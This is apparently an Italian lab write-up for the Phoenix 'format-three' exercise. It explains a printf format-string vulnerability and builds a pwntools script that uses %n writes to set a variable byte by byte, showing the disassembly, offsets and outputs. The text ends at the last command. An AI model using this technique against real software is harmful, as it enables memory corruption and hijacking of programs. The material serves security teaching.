### Descrizione del Codice

Il programma `format_three.c` introduce la scrittura di valori specifici in memoria e come ciò possa essere realizzato.

### Funzionamento del Programma

1. Il programma legge un input dall'utente e lo memorizza in `buf`.
2. Chiama la funzione `bounce` che stampa il contenuto di `buf` usando `printf`.
3. Controlla se la variabile `changeme` è stata impostata al valore specifico `0x64457845`.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `printf` con un input controllato dall'utente senza specificare un formato, il che può causare una vulnerabilità di formato. Questo può essere sfruttato per scrivere un valore specifico nella variabile `changeme`.

### Exploit

L'exploit sfrutta la vulnerabilità di formato per scrivere il valore `0x64457845` nella variabile `changeme`.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```sh
$ gdb -q /opt/phoenix/i486/format-three 
Reading symbols from /opt/phoenix/i486/format-three...(no debugging symbols found)...done.

gef➤  disassemble main 
Dump of assembler code for function main:
.....
   0x08048551 <+85>:	call   0x80484e5 <bounce>
   0x08048556 <+90>:	add    esp,0x10
   0x08048559 <+93>:	mov    eax,ds:0x8049844
   0x0804855e <+98>:	cmp    eax,0x64457845
.....

L'indirizzo di changeme è 0x8049844.

Ora per ottenere l'offset dell'input:

$ /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
AAAA%x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA0 0 0 f7f81cf7 f7ffb000 ffffd708 8048556 ffffc700 ffffc700 fff 0 41414141 25207825 78252078

Possiamo vedere il nostro input 41414141 che è AAAA all'offset 12.

Ora per scrivere all'indirizzo di changeme scriveremo byte per byte, quindi prima inseriamo i quattro byte dell'indirizzo di changeme.

changeme = 0x8049844

buff = ""
buff += p32(changeme+0)
buff += p32(changeme+1)
buff += p32(changeme+2)
buff += p32(changeme+3)

Poi inseriamo l'offset che è %x * 11 (ricorda che l'input è all'offset 12).
E infine scriviamo in memoria con %n.

buff += "%x " * 11
buff += "%n"

$ python solve.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd708 8048556 ffffc700 ffffc700 fff 0 
Better luck next time - got 0x00000051, wanted 0x64457845!

Siamo riusciti a scrivere con successo al primo byte di changeme ma il valore scritto è 0x51 e abbiamo bisogno di 0x45 :(

Per superare questo problema scriviamo 0x145 invece di 0x45 (possiamo solo aumentare).

Abbiamo già 0x51 quindi per raggiungere 0x145 abbiamo bisogno di 244 byte in più (0x145 - 0x51).

buff += "%x " * 11
buff += 'A' * 244
buff += "%n"

$ python solve.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd708 8048556 ffffc700 ffffc700 fff 0 
Better luck next time - got 0x00000145, wanted 0x64457845!

Bytes_written_until_now = 0x145

Il byte successivo deve essere 0x78 e abbiamo 0x145 (ricorda che possiamo solo aumentare) quindi scriveremo 0x178 invece.

Bytes_needed = 0x178 - 0x145 = 51 byte di riempimento.

buff += 'A' * 51
buff += "%n"

Bytes_written_until_now = 0x178

Il terzo byte deve essere 0x45 e abbiamo 0x178 quindi scriveremo 0x245 (0x145 darebbe un numero negativo).

Bytes_needed = 0x245 - 0x178 = 205 byte di riempimento.

buff += 'A' * 205
buff += "%n"

Bytes_written_until_now = 0x245

L'ultimo byte deve essere 0x64 e abbiamo 0x245 quindi scriveremo 0x264.

Bytes_needed = 0x264 - 0x245 = 31 byte di riempimento.

buff += 'A' * 31
buff += "%n"

# solve.py

from pwn import *

changeme = 0x8049844

buff = ""
buff += p32(changeme+0)
buff += p32(changeme+1)
buff += p32(changeme+2)
buff += p32(changeme+3)

buff += '%x ' * 11      # offset to first byte

buff += 'A' * 244       # JUNK
buff += "%n"            # write to first byte

buff += 'A' * 51        # JUNK
buff += "%n"            # write to second byte

buff += 'A' * 205       # JUNK
buff += "%n"            # write to third byte

buff += 'A' * 31        # JUNK
buff += "%n"

print(buff)

Eseguiamo lo script:
$ python solve.py | /opt/phoenix/i486/format-three 